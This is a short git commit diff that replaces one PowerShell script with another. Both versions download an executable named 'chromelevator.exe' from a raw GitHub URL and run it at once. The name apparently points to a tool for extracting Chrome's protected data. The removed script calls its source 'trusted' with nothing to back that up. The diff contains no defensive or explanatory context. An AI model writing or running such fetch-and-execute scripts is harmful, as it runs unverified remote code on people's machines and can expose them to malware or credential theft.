5bd406ab81b888b84e9181c1f90b0d53e4d39214
joyboy <197599897+np4abdou1@users.noreply.github.com>
2025-11-14 09:19:58 +0100

    Update and rename run.ps1 to hi.ps1

---
+++ hi.ps1
@@ -0,0 +1,4 @@
+mkdir hi
+cd hi
+curl -L "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/chromelevator.exe" -o chromelevator.exe
+./chromelevator.exe
--- run.ps1
+++
@@ -1,6 +0,0 @@
-# Download + run EXE from trusted source
-$url  = "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/chromelevator.exe"
-$file = "$env:TEMP\chromelevator.exe"
-
-Invoke-WebRequest $url -OutFile $file
-Start-Process $file
